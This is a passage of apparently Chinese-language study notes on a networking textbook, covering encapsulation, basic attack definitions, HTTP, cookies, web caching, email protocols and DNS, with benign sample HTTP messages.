title="封装"></a>封装</h3><p>应用层报文和运输层首部信息一起构成了运输层报文段，附加的信息包括差错检测位信息。网络层增加了源和目的端地址等首部。每一层都对上一层的数据进行了封装。</p><p>因特网协议栈自顶向下传输时，各层会将上层信息包装，上层信息包装为有效载荷字段，本层信息包装为首部字段</p><p>在发送主机端，一个应用层报文被发送到运输层。运输层收取到报文并附上附加信息(运输层首部信息)，该首部将被接收端的运输层使用。应用层报文和运输层首部信息(差错检测信息等)一起构成了运输层报文段。运输层报文段因此封装了应用程报文。运输层则向网络层传递该报文段，网络层增加了网络层首部信息(源和目的端系统地址等)，产生了网络层数据报。该数据报接下来传递给链路层，链路层增加了自己的链路层首部信息并创建了链路层帧。所以，在一层，一个分组有两种类型字段:首部字段和有效载荷字段(通常来自上一个分组)。</p><h4 id="源主机的封装"><a href="#源主机的封装" class="headerlink" title="源主机的封装"></a>源主机的封装</h4><p>1.在应用层交换的数据称为消息。消息通常不包含任何头部和尾部，包含也统称为消息</p><p>2.传输层将传来的消息称为有效载荷，该载荷是传输层应该关注的负载。传输层在有效载荷基础上增加传输层头部，包含通信的源和目的应用程序的标识符等。其结果为一个传输层分组，该分组在TCP中称为段，在UDP中称为用户数据报</p><p>3.网络层把传输层分组作为数据或有效载荷，并且在该有效何在上添加自己的头部。头部包含源和目的主机的地址，以及用于头部差错检查、分片的信息等。其结果为一个称为数据报的网络层分组。</p><p>4.数据链路层把网络层分组作为数据或有效载荷，并且添加自己的头部。该头部包含主机或下一跳步（路由器）的链路层地址。其结果为一个称为帧的链路层分组。</p><h4 id="路由器的解封装与封装"><a href="#路由器的解封装与封装" class="headerlink" title="路由器的解封装与封装"></a>路由器的解封装与封装</h4><p>1.在比特集被投递到数据链路层后，从帧中解封装出数据报投递到网络层</p><p>2.网络层只检查数据报头部的源地址和目的地址，查阅它的转发表以寻找数据报投递的下一跳步。若数据报太大对其分片，内容不会被改变</p><p>3.数据链路层将数据报封装成一个帧，传递到物理层</p><h2 id="面对攻击的网络"><a href="#面对攻击的网络" class="headerlink" title="面对攻击的网络"></a>面对攻击的网络</h2><p>**<code>病毒：</code>**一种需要某种形式的用户交互来感染用户设备的恶意软件。<br>**<code>蠕虫：</code>**无需任何明显用户交互就能进入设备的恶意软件。</p><h3 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h3><p><strong><code>弱点攻击：</code></strong> 向一台目标主机上运行的易受攻击的应用程序或操作系统发送制作精细的报文</p><p><strong><code>带宽洪泛：</code></strong> 向目标主机发送大量的分组，分组过多使目标的接入链路变得拥塞，使得合法的分组无法到达服务器。</p><p><strong><code>连接洪泛:</code></strong> 攻击者在目标主机中创建大量的半开或全开TCP连接。该主机因这些连接陷入困境，并停止接受合法的连接。</p><h3 id="嗅探攻击："><a href="#嗅探攻击：" class="headerlink" title="嗅探攻击："></a>嗅探攻击：</h3><p>通过被动接收机接收数据，从而获取口令，商业秘密的私密信息，最好的防范方法是难以破解的密码。</p><h3 id="IP哄骗："><a href="#IP哄骗：" class="headerlink" title="IP哄骗："></a>IP哄骗：</h3><p>将具有虚假源地址的分组注入因特网</p><h3 id="中间人攻击："><a href="#中间人攻击：" class="headerlink" title="中间人攻击："></a>中间人攻击：</h3><p>处于信息传递着的中间，获取或修改数据。</p><h2 id="二、应用层"><a href="#二、应用层" class="headerlink" title="二、应用层"></a>二、应用层</h2><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920162332837.png"></p><h2 id="应用层协议原理"><a href="#应用层协议原理" class="headerlink" title="应用层协议原理"></a>应用层协议原理</h2><h3 id="网络应用程序体系结构"><a href="#网络应用程序体系结构" class="headerlink" title="网络应用程序体系结构"></a>网络应用程序体系结构</h3><p><strong><code>应用体系结构</code></strong> 由应用程序研发者设计，规定了如何在各种端系统上组织该应用程序。在选择应用程序结构体系时，应用程序研发者很可能利用现代网络应用程序中所使用的两种主流体系结构之一，**<code>客户-服务器体系结构</code>** 或**<code>对等（P2P）体系结构</code>**</p><h4 id="客户-服务器体系结构-CS-："><a href="#客户-服务器体系结构-CS-：" class="headerlink" title="客户-服务器体系结构(CS)："></a>客户-服务器体系结构(CS)：</h4><p>1.有一个总是打开的主机称为服务器，它服务于来自许多其他称为客户的主机的请求。</p><p>2.特点的一对多，一台服务器对应多个客户机</p><p>3.客户之间不能直接通信，需要经过服务器</p><p>4.服务器是处理所有逻辑的中心，具有固定的ip地址，客户总能通过向该服务器的IP地址发送分组来与其联系</p><p>5.基础设施密集。虽然客户机/服务器体系结构的特征是“一对多”，但是服务器却并不总是一台，因为有的时候要处理海量的客户机的请求， 一台服务器很快就会不堪重负，所以这个时候常用服务器集群技术（server clustering）创建强大的虚拟服务器。所以此时这里“一对多”的一要理解为一组服务器组成的“一”个整体的意思</p><p>6.应用：WEB，FTP，电子邮件，Telnet</p><h4 id="P2P体系结构："><a href="#P2P体系结构：" class="headerlink" title="P2P体系结构："></a>P2P体系结构：</h4><p>1.对位于数据中心的专用服务器有最小（或者没有）依赖，应用程序在间断的主机对之间使用直接通信，对于这些主机称为对等方</p><p>2.特点：客户机间的直接通信使得P2P有了强大的自扩展性<br>（self-calability），比如下载文件时接收到文件的主机又可以直接把文件上载给其他的主机，因此对基础设施服务器依赖较小，并且可上载该文件的主机的数量是指数递增的，系统的服务能力只会越来越强。</p><p>3.应用：文件分发，因特网电话，文件搜索</p><p>4.任意的端系统直接通信</p><p>5.对等方间歇地连接，改变IP地址</p><p>6.P2P应用由于高度非集中式结构，面临安全性，性能和可靠性的挑战</p><h4 id="区别："><a href="#区别：" class="headerlink" title="区别："></a>区别：</h4><p>应用程序体系结构（P2P, 客户-服务器）来自于应用设计者设定下更加宽泛的结构，而网络体系结构注重于通信进程的结构组织</p><h3 id="进程通信"><a href="#进程通信" class="headerlink" title="进程通信"></a>进程通信</h3><p>进行通信的实际是进程而不是程序，一个进程可以认为是运行在端系统中的一个程序。两个不同端系统上的进程，可以通过跨越计算机网络交换报文而相互通信。</p><h4 id="客户和服务器进程："><a href="#客户和服务器进程：" class="headerlink" title="客户和服务器进程："></a>客户和服务器进程：</h4><p>1.网络应用程序由成对的进程组成，这些进程通过网络相互发送报文</p><p>2.两个进程一个标识为客户，一个标识为服务器</p><p>3.在一对进程之间的通信绘画会话场景中，发起通信的进程被标识为客户，回话开始时等待联系的进程时服务器</p><h4 id="进程与计算机网络中的接口："><a href="#进程与计算机网络中的接口：" class="headerlink" title="进程与计算机网络中的接口："></a>进程与计算机网络中的接口：</h4><p>1.进程通过套接字的软件接口向网络发送和接收报文</p><p>2.套接字时同一台主机内应用层和运输层之间的接口，套接字是建立网络程序的可编程接口，因此套接字称为应用程序和网络之间的应用程序编程接口（api）</p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920162437807.png"></p><h4 id="进程寻址："><a href="#进程寻址：" class="headerlink" title="进程寻址："></a>进程寻址：</h4><p>一台主机的进程向另一台主机的进程发送分组，接收进程需要一个地址。为了标识该进程，需要定义两种信息：</p><p>**<code>主机的地址：</code>**用IP地址标识；</p><p>**<code>定义在目标主机中的接收进程的标识符：</code>**用目的地端口号标识。</p><h3 id="可供应用程序使用的运输服务"><a href="#可供应用程序使用的运输服务" class="headerlink" title="可供应用程序使用的运输服务"></a>可供应用程序使用的运输服务</h3><p>1.可靠数据传输。容忍丢失的应用。</p><p>2.吞吐量:带宽敏感应用。弹性应用。</p><p>3.定时</p><p>4.安全性</p><h3 id="因特网提供的运输服务"><a href="#因特网提供的运输服务" class="headerlink" title="因特网提供的运输服务"></a>因特网提供的运输服务</h3><p>因特网为应用程序提供了两个运输服务类型UDP和TCP</p><h4 id="TCP服务："><a href="#TCP服务：" class="headerlink" title="TCP服务："></a>TCP服务：</h4><p><strong><code>面向连接服务：</code></strong> 在应用层数据报文流动之前，TCP让客户和服务器互相交换运输层控制信息，握手阶段后，TCP连接就在两个进程的套接字之间建立了</p><p><strong><code>可靠的信息传送服务：</code></strong> 通信进程能够依靠TCP，无差错、按适当顺序交付所有发送的数据</p><p><strong><code>拥塞控制机制：</code></strong> 发送方和接收方之间的网络出现拥塞时，TCP 的拥塞控制机制会抑制发送进程。 TCP 拥塞控制机制也试图限制每个 TCP 连接，使他们达到公平共享网络带宽的目的。 这种服务不一定为通信进程带来直接好处，但是能为因特网带来整体好处。</p><p><strong><code>安全套接字层（SSL）：</code></strong> 用SSL加强后的TCP不仅能够做TCP所做的一切，而且提供了关键的进程到进程的安全性服务。</p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920162459350.png"></p><h4 id="UDP服务："><a href="#UDP服务：" class="headerlink" title="UDP服务："></a>UDP服务：</h4><p>1.UDP 是一种不提供不必要服务的轻量级运输协议，它仅提供最小服务。</p><p>2.UDP 是无连接的，因此在两个进程通信之前无握手。</p><p>3.UDP 协议提供一种不可靠数据传送服务，也就是说，当进程将一个报文发送<br>进</p><p>4.UDP 套接字时，UDP并不保证该报文到达接收进程。不仅如此，到达接收进程的报文也可能是乱序到达的。</p><p>5.UDP 没有包括拥塞控制机制，所以 UDP 的发送端可以用它选定的任何速率向其下层（网络层）注入数据</p><p>6.不抑制发送速率，实时应用通常选择UDP</p><h4 id="因特网运输协议不提供的服务："><a href="#因特网运输协议不提供的服务：" class="headerlink" title="因特网运输协议不提供的服务："></a>因特网运输协议不提供的服务：</h4><p>1.TCP 能提供可靠的数据传输服务，也能通过 SSL 来加强以提供安全服务。</p><p>2.今天的因特网通常能够为时间敏感应用提供满意的服务，但不能提供任何定时或带宽保证。</p><h4 id="TCP和UDP的应用："><a href="#TCP和UDP的应用：" class="headerlink" title="TCP和UDP的应用："></a>TCP和UDP的应用：</h4><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920162519669.png"></p><h3 id="应用层协议"><a href="#应用层协议" class="headerlink" title="应用层协议"></a>应用层协议</h3><p>1.应用层协议定义了运行在不同端系统上的进程如何相互传递报文。</p><p>2.交换报文的类型，例如请求报文和响应报文。</p><p>3.各种报文类型的语法，如报文中各个字段及这些字段是如何描述的。</p><p>4.字段的语义，即这些字段中包含的信息的含义。</p><p>5.一个进程何时以及如何发送报文，对报文进行响应的规划。</p><h2 id="WEB和HTTP"><a href="#WEB和HTTP" class="headerlink" title="WEB和HTTP"></a>WEB和HTTP</h2><h3 id="HTTP概况"><a href="#HTTP概况" class="headerlink" title="HTTP概况"></a>HTTP概况</h3><p>1.web的应用层协议是超文本传输协议，它是web的核心</p><p>2.http由两个程序实现：客户程序和服务器程序</p><p>3.web页面是由对象组成的，一个对象只有一个文件，多数web页面含有一个<br>html基本文件以及几个引用对象</p><p>4.html基本文件通过对象的URL的地址引用页面中的其他对象，URL由两部分组成：存放对象的主机名和路径名</p><p>5.web浏览器实现了http的客户端，web服务器实现了http的服务器端。</p><p>6.http定义了web客户向web服务器请求web页面的方式，以及服务器向客户传送web页面的方式</p><p>7.服务器向客户发送被请求的文件，而不储存任何关于客户的状态信息，所以<br><strong><code>http是无状态协议</code></strong></p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920162541334.png"></p><h3 id="非持续连接和持续连接"><a href="#非持续连接和持续连接" class="headerlink" title="非持续连接和持续连接"></a>非持续连接和持续连接</h3><h4 id="非持续连接的HTTP："><a href="#非持续连接的HTTP：" class="headerlink" title="非持续连接的HTTP："></a>非持续连接的HTTP：</h4><p><strong><code>每个请求/响应是经过一个单独的TCP连接发送。</code></strong></p><p>每个TCP连接只传输一个请求报文和一个响应报文。因此一次请求Web页面往往要产生多个TCP连接。</p><p>缺点：<br>必须为每个请求的对象建立和维护一个全新的连接；每个对象要经受两倍RTT的交付时延，一个RTT用于创建TCP，一个传输。总响应时间是两个RTT加上服务器传输HTML文件的时间。<img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920162615427.png"></p><h4 id="持续连接的HTTP："><a href="#持续连接的HTTP：" class="headerlink" title="持续连接的HTTP："></a>持续连接的HTTP：</h4><p><strong><code>所有的请求以及响应经相同的TCP连接发送。</code></strong></p><p>1.在采用持续连接的情况下，服务器再发送响应后保持该 TCP 连接打开。再相同的客户与服务器之间的后续请求和响应报文能够通过相同的连接进行传送。</p><p>2.一般来说，如果一条连接经过一定的时间间隔（一个可配置的时间间隔）仍未被使用，HTTP 服务器就关闭该连接。</p><p>3.HTTP 的默认模式是使用带流水线的持续连接。</p><h3 id="http报文格式"><a href="#http报文格式" class="headerlink" title="http报文格式"></a>http报文格式</h3><h4 id="http请求报文："><a href="#http请求报文：" class="headerlink" title="http请求报文："></a>http请求报文：</h4><p><em>plain</em></p><pre class="line-numbers language-none"><code class="language-none">GET /somedir/page.html HTTP/1.1      //请求行Host: www.somechool.edu              //指明了对象所在的主机Connection: close                    //要求服务器发送完请求的对象后就关闭该连接User-agent: Mozilla/5.0              //用来指明用户代理，即向服务器发送请求的浏览器的类型Accept-language: fr                  //指明了用户想要得到该对象的中文版本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong><code>请求行有三个字段：</code></strong></p><p>方法字段：包括 GET、POST、HEAD、PUT 和 DELETE。绝大部分报文使用 GET 方法。</p><p>URL 字段</p><p>HTTP 版本字段</p><p><strong><code>通用格式:</code></strong></p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920162647992.png"></p><h4 id="http响应报文："><a href="#http响应报文：" class="headerlink" title="http响应报文："></a>http响应报文：</h4><pre class="line-numbers language-none"><code class="language-none">HTTP/1.1 200 OK                                  //状态行（3个字段：版本协议字段、状态码和相应状态信息）Connection: close                                //发送完报文后关闭TCP连接 Date: Tue, 18 Aug 2015 15:44:04 GMT              //服务器产生并发送该响应报文的日期和时间Server: Apache/2.2.3 (CentOS)                    //改报文是Apache web服务器产生的Last-Modified: Tue, 18 Aug 2015 15:11:03 GMT     //代理服务器Content-Length: 6821                             //指示了被发送对象的字节数Content-Type: text/html                          //指示了实体体中的对象是html文本(data data data data data ......)                //实体体<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong><code>常见的状态码和相关短语：</code></strong></p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920162706772.png"></p><p><strong><code>通用格式：</code></strong></p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920162716590.png"></p><h3 id="用户和服务器的交互-cookie"><a href="#用户和服务器的交互-cookie" class="headerlink" title="用户和服务器的交互(cookie)"></a>用户和服务器的交互(cookie)</h3><p>http服务器是无状态的，Web 站点通常希望能够识别用户，为此，HTTP 使用了 cookie ，它允许站点对用户进行跟踪</p><p><strong><code>cookie 有 4 个技术组件：</code></strong></p><p>1.在 HTTP 响应报文中的一个 cookie 首部行；</p><p>2.在 HTTP 请求报文中的一个 cookie 首部行；</p><p>3.在用户端系统中保留有一个 cookie 文件，并由用户的浏览器进行管理；</p><p>4.位于 Web 站点的一个后端数据库。</p><p>在web站点后台有数据库。其工作原理是，用户第一次访问某服务器时，其响应报文中包含一个Set-cookie字段，该字段的值往往是服务器设定的唯一标识码，浏览器将该字段和服务器主机名等信息保存在本地，以后用户每次访问时，浏览器都会从cookies中找到该站点的标识码放在请求报文中发送，这样服务器就能通过这个唯一标识辨认这个用户，通过用户在网站上的浏览记录采取行为。</p><p><strong><code>cookie的工作过程：</code></strong></p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920162738219.png"></p><h3 id="web缓存"><a href="#web缓存" class="headerlink" title="web缓存"></a>web缓存</h3><p>1.Web缓存器也叫 代理服务器，是能够代表 Web 服务器来满足 HTTP 请求的网络实体。</p><p>2.Web服务器有自己的磁盘存储空间，并在存储空间中保存着最近存储过的对象的副本。</p><p>3.可以配置用户的浏览器，使得用户所有的 HTTP 请求首先指向 Web 缓存器。</p><p>4.客户与 Web 缓存器之间的速度通常比较快，所以可以提高访问的速度，降低时延。</p><p>5.客户通过 Web 缓存器请求对象</p><p>6.当浏览器申请一个文件时，先建立一个到web缓存的TCP连接，如果缓存服务器上有这个文件就返回，否则，他就建立一个到原始服务器的TCP获得该文件并存储，之后将该文件发回客户端。web缓存可以大幅减少对客户端的响应时间，减少机构内部网络和internet之间的链路通信量并节约带宽。这样会带来的新的问题是，web缓存上的文件可能是陈旧的。为此HTTP引入了条件get，即web缓存在保存一个文件时会记录其最后修改时间，客户端每次请求文件时，web缓存会向原始服务器发送一个带有if-modified-since的报文，如果该文件没有改动就直接把缓存中的文件返回给用户，否则重新下载该文件。</p><h3 id="条件get的方法"><a href="#条件get的方法" class="headerlink" title="条件get的方法"></a>条件get的方法</h3><p>条件get方法用来解决 Web 缓存器中的对象拷贝可能是旧的的问题</p><p><strong><code>条件</code></strong></p><p>①请求报文使用 GET 方法。</p><p>②请求报文中包含一个 If-Modified-Since: 首部行</p><h2 id="因特网中的电子邮件"><a href="#因特网中的电子邮件" class="headerlink" title="因特网中的电子邮件"></a>因特网中的电子邮件</h2><p>因特网电子邮箱系统有三个重要的组成部分：</p><p><strong><code>①用户代理②邮件服务器③简单邮件传输协议（SMTP）</code></strong></p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920162830790.png"></p><h3 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h3><p>1.SMTP是因特网电子邮件应用的核心，用于从发送方的邮件服务器发送报文到接收方的邮件服务器</p><p>2.SMTP 是因特网中电子邮件中主要的应用层协议。它使用 TCP 可靠数据传输</p><p>3.SMTP 限制所有的邮件报文只能采用简单的 7 比特 ASCII 表示。</p><p>邮件发送过程是：从发送方的用户代理开始，传输到发送方的邮件服务器，再传输到接收方的邮件服务器，然后在这里被分发到接收方的邮箱上</p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920162844658.png"></p><ul><li>如果 Bob 的邮件服务器没有开机，该报文会保留在 Alice 的邮件服务器上并尝试进行新的尝试。这意味着邮件并不会在中间的某个邮件服务器存留。</li><li>SMTP 一般不使用中间服务器发送邮件，即使这两个邮件服务器位于地球的两端也一样。</li><li>SMTP 用的是 持续链接：如果发送邮件服务器有几个报文发往同一个接收邮件服务器，它可以通过同一个 TCP 连接发送所有的的报文。</li></ul><h3 id="与HTTP对比"><a href="#与HTTP对比" class="headerlink" title="与HTTP对比"></a>与HTTP对比</h3><p><strong><code>不同：</code></strong></p><ul><li>HTTP主要是一个拉协议，TCP连接由想要接收文件的机器发起。即在方便的时候，某些人在Web服务器上装载信息，用户使用HTTP从该服务器上拉取这些信息。</li><li>SMTP基本上是一个推协议，TCP连接由想要发送该文件的机器发起。即发送邮件服务器到接收邮件服务器</li><li>SMTP要求每个报文使用7比特ASCLL码形式。HTTP不受限制</li><li>处理一个既包含文本又包含图形的文档，HTTP把每个对象封装到自己的HTTP响应报文中，SMTP则把所有的报文对象放在一个报文之中。</li></ul><p><strong><code>相同：</code></strong></p><ul><li>都用于从一台主机向另一台主机传送文件。</li><li>都使用持续连接。</li></ul><h3 id="邮件报文格式"><a href="#邮件报文格式" class="headerlink" title="邮件报文格式"></a>邮件报文格式</h3><p>每个首部必须含有一个From：首部行和一个To：首部行；也许有Subject：首部行以及其他可选的首部行</p><h3 id="邮件访问协议"><a href="#邮件访问协议" class="headerlink" title="邮件访问协议"></a>邮件访问协议</h3><p>邮件访问使用**<code>客户-服务器体系结构</code>** ，用户通过用户端系统上运行的客户程序阅读电子邮件</p><p><strong><code>流行的邮件访问协议：</code></strong></p><p>①第三版邮局协议（POP3）</p><p>②因特网邮件访问协议(IMAP)</p><p>③HTTP(基于web的电子邮件)</p><h4 id="POP3"><a href="#POP3" class="headerlink" title="POP3"></a>POP3</h4><p>比较简单的邮件范文协议。</p><p>按三个阶段工作：</p><p>①特许阶段：特许、事物处理以及更新。第一阶段通过用户名和口令鉴别用户；</p><p>②事务处理阶段：第二阶段用户取回报文等操作；</p><p>③更新阶段：第三阶段退出，邮件服务器会删除那些被标记为删除的报文。</p><h4 id="IMAP"><a href="#IMAP" class="headerlink" title="IMAP"></a>IMAP</h4><p>POP3协议只在本地维持邮件的文件夹，不提供任何创建远程文件夹并为报文指派文件夹的方法。而IMAP服务器把每个报文与一个文件夹联系起来，为用户提供创建文件夹以及将邮件从一个文件夹移动到另一个文件夹的命令，允许用户<br>代理获取报文组件的命令。</p><h4 id="基于web的电子邮件"><a href="#基于web的电子邮件" class="headerlink" title="基于web的电子邮件"></a>基于web的电子邮件</h4><p>使用浏览器收发邮件时，从用户到邮件服务器之间用HTTP传输。</p><h2 id="DNS因特网的目录服务"><a href="#DNS因特网的目录服务" class="headerlink" title="DNS因特网的目录服务"></a>DNS因特网的目录服务</h2><p>主机的一种标识方式是用主机名，也可以用ip地址标识</p><p>①主机名：thriumph.top</p><p>②ip地址：xxx.xxx.xxx.xxx</p><h3 id="DNS提供的服务"><a href="#DNS提供的服务" class="headerlink" title="DNS提供的服务"></a>DNS提供的服务</h3><p>1.人们便于记忆主机名的方式，而路由器喜欢定长的具有层次结构的IP地址，所以需要一种能进行主机名到IP地址转换的服务，也就是域名系统(Domain Name System，DNS)</p><p>2.DNS 协议基于 UDP ，使用 53 端口</p><p>3.DNS也是应用层协议，它通常会被其他应用层协议所使用，包括HTTP、SMTP和FTP，将用户的主机名解析为 IP 地址</p><p><strong><code>DNS域名系统是</code></strong></p><p>①一个由分层的 DNS 服务器 实现的分布式数据库</p><p>②一个使得主机能够查询分布式数据库的应用层协议</p><p><strong><code>DNS的其他服务：</code></strong></p><p>①识别主机别名（用于HTTP、FTP）：有着复杂主机名的主机能拥有一个或者多个别名</p><p>②识别邮件服务器别名（用于SMTP）：便于记忆的电子邮件别名。</p><p>③负载分配：DNS可以用于冗余服务器之间进行负载分配。单个站点会有多台服务器，DNS数据中心会存储这些IP地址集合，因此多个服务器可以有相同的别名</p><h3 id="DNS工作机理的概述"><a href="#DNS工作机理的概述" class="headerlink" title="DNS工作机理的概述"></a>DNS工作机理的概述</h3><p>当主机上的DNS客户端收到一个转换请求时，客户端将向网络发送一个DNS查询报文，然后客户端将收到一个包含相关信息的DNS回答报文，这个报文里有客户端想要的内容，之后DNS客户端将IP地址返回给请求的提出者</p><h4 id="分布式，层次数据库："><a href="#分布式，层次数据库：" class="headerlink" title="分布式，层次数据库："></a>分布式，层次数据库：</h4><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920162928465.png"></p><p>为了处理扩展性问题，DNS服务器采用层次式组织，并且分布在全世界范围内；大致来说，存在三种DNS服务器</p><p><strong><code>DNS服务器：</code></strong></p><p>①根 DNS 服务器：因特网上有13个根DNS服务器，大部分分布在北美洲，尽管我们可以将这13个根DNS服务器视为单个的服务器，但是每台服务器实际上是一个冗余的计算机网络以提供安全性和可靠性</p><p>②顶级域（DNS）服务器：负责顶级域名，如com，org，net，edu，gov以及各个国家的顶级域名的转换</p><p>③权威DNS服务器：因特网上，具有公共可访问主机的每个组织机构必须公共可访问的DNS记录，这些记录将主机名映射为IP地址。一个组织的权威DNS服务器收藏了这些DNS记录，多数大学和大公司实现和维护它们自己的基本和辅助（备份）权威DNS服务器；当然，也可以通过付费的方式，将相关的信息插入到其它权威服务器中</p><p>还有一种不在DNS层次结构之中，是本地DNS服务器。本地DNS服务器通常邻近其所在网络的其他主机。当主机发出DNS请求时，该请求被发往本地DNS服务器，它起着代理的作用，并将请求转发到DNS服务器层次结构中。DNS服务器的层次结构，每个ISP都有一台本地DNS服务器。</p><h4 id="DNS查询"><a href="#DNS查询" class="headerlink" title="DNS查询"></a>DNS查询</h4><p>①递归查询</p><p>②迭代查询</p><p>从请求主机到本地DNS服务器的查询是递归的，其他查询是迭代的，如果请求的接收者不知道所请求的内容，那么接收者将扮演请求者，发出有关请求，直到获得所需要的内容，然后将内容返回给最初的请求者。也就是说，在递归查询中，一定要给请求者想要的答案；迭代查询则是指，如果接收者没有请求者所需要的准确内容，接收者将告诉请求者，如何去获得，但是自己并不去发出请求</p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920162943326.png"></p><h4 id="DNS缓存："><a href="#DNS缓存：" class="headerlink" title="DNS缓存："></a>DNS缓存：</h4><p>为了改善时延性能并减少在因特网上传输的DNS报文数量，DNS使用缓存技术。通常在本地服务器实现，可以缓存主机名/IP地址对，可以缓存TLD服务器地址，从而绕过根DNS服务器</p><h3 id="DNS记录和报文"><a href="#DNS记录和报文" class="headerlink" title="DNS记录和报文"></a>DNS记录和报文</h3><p>资源记录是一个4元组：（Name，Value，Type，TTL）</p><p>TTL为该记录的生存时间，决定了资源记录应当从缓存中删除的时间。</p><p>①Type=A，则Name是主机名，Value是该主机名对应的IP地址。</p><p>②Type=NS，则Name是域，Value是如何获取该域中主机IP地址的权威DNS服务<br>器的主机名。</p><p>③Type=CNAME，则Value是别名为Name的主机对应的规范主机名。</p><p>④Type=MX，则Value是别名为Name的邮件服务器对应的规范主机名。从而使得同一公司的邮件服务器和web服务器可以使用相同别名。</p><p>所以如果一条记录为type=A，则它直接包含了需要的信息；如果是NS，需要进一步得到权威DNS服务器的IP地址（不一定需要再次请求哦~），然后向其发出，请求希望得到一条A记录；而type=CNAME和MX的记录则实现了主机别名到主机规范名的转换，可以通过该规范名继续构建查询链条，直到获得希望的IP地址</p><h4 id="DNS报文"><a href="#DNS报文" class="headerlink" title="DNS报文"></a>DNS报文</h4><p>DNS报文有两种，即查询报文和回答报文，并且两种报文有着相同的结构：</p><p><img 